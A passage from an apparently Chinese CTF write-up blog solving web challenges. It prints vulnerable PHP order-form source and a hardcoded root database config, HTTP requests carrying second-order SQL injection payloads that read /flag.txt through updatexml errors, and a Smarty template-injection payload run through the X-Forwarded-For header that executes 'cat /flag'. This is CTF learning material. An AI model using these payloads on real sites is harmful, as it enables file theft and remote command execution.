class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;删除订单&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;h1&gt;删除订单&lt;&#x2F;h1&gt;</span><br><span class=\"line\">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;删除订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot; style&#x3D;&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;config.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$DATABASE &#x3D; array(</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;,</span><br><span class=\"line\">    &quot;username&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class=\"line\">    &quot;password&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class=\"line\">    &quot;dbname&quot; &#x3D;&gt;&quot;ctfusers&quot;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$db &#x3D; new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;confirm.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;;</span><br><span class=\"line\">&#x2F;&#x2F;var_dump($_POST);</span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class=\"line\">        $msg &#x3D; $user_name.&quot;已提交订单&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class=\"line\">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class=\"line\">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class=\"line\">        $re &#x3D; $re-&gt;execute();</span><br><span class=\"line\">        if(!$re) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;订单提交成功&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;确认订单&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-zh.png&quot;&gt;</span><br><span class=\"line\">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">                &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">                &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。</p>\n<p>因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/confirm.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 105</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/change.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 29</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1</span><br></pre></td></tr></table></figure>\n\n<p>回显数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">errorXPATH syntax error: &#39;flag&#123;e9485017-ebf4-4ea4-8579-daa&#39;</span><br></pre></td></tr></table></figure>\n\n<p>显示不全，再逆向输出一下</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/confirm.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 114</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/change.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 29</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1</span><br></pre></td></tr></table></figure>\n\n<p>输出内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">errorXPATH syntax error: &#39;</span><br><span class=\"line\">&#125;6e91d8479aad-9758-4ae4-4fbe-71&#39;</span><br></pre></td></tr></table></figure>\n\n<p>拼接即可</p>\n<h2 id=\"华东南赛区-Web11\"><a href=\"#华东南赛区-Web11\" class=\"headerlink\" title=\"华东南赛区 Web11\"></a>华东南赛区 Web11</h2><p><a href=\"https://zhuanlan.zhihu.com/p/28823933\" target=\"_blank\" rel=\"noopener\">关于SSTI</a></p>\n<p>打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For</p>\n<p><img src=\"/pic/94.png\" alt=\"\"></p>\n<p>可能存在SSTI，测试一下的确存在SSTI</p>\n<p><img src=\"/pic/96.png\" alt=\"\"></p>\n<p>在网页的最下方发现了<strong>Build With Smarty</strong> </p>\n<p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30</p>\n<p><img src=\"/pic/97.png\" alt=\"\"></p>\n<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了</p>\n<p><img src=\"/pic/98.png\" alt=\"\"></p>\n<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>\n<p>那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>有一个<a href=\"https://www.smarty.net/docs/zh_CN/language.function.if.tpl\" target=\"_blank\" rel=\"noopener\">{if}标签</a>可以使用</p>\n<p>marty的<code>{if}</code>条件判断和PHP的<a href=\"http://php.net/if\" target=\"_blank\" rel=\"noopener\">if</a> 非常相似，只是增加了一些特性。 每个<code>{if}</code>必须有一个配对的<code>{/if}</code>. 也可以使用<code>{else}</code> 和 <code>{elseif}</code>. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, <em>or</em>, <em>&amp;&amp;</em>, <em>and</em>, <em>is_array()</em>, 等等.</p>\n<p>将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo</p>\n<p><img src=\"/pic/99.png\" alt=\"\"></p>\n<p>{if system(‘cat /flag’)}{/if}即可获取到flag</p>\n<p><a href=\"https://www.jianshu.com/p/eb8d0137a7d3\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n<h2 id=\"华东北赛区-Web2\"><a href=\"#华东北赛区-Web2\" class=\"headerlink\" title=\"华东北赛区 Web2\"></a>华东北赛区 Web2</h2><p>使用御剑扫描发现login.php，admin.php</p>\n<p><img src=\"/pic/100.png\" alt=\"\"></p>\n<p>访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿</p>\n<p><img src=\"/pic/101.png\" alt=\"\"></p>\n<p>明显的提示这题是XSS</p>\n<p>提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。</p>\n<p>来自赵师傅的payload     svg标签 ：xml自动解析html实体编码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">in_str = <span 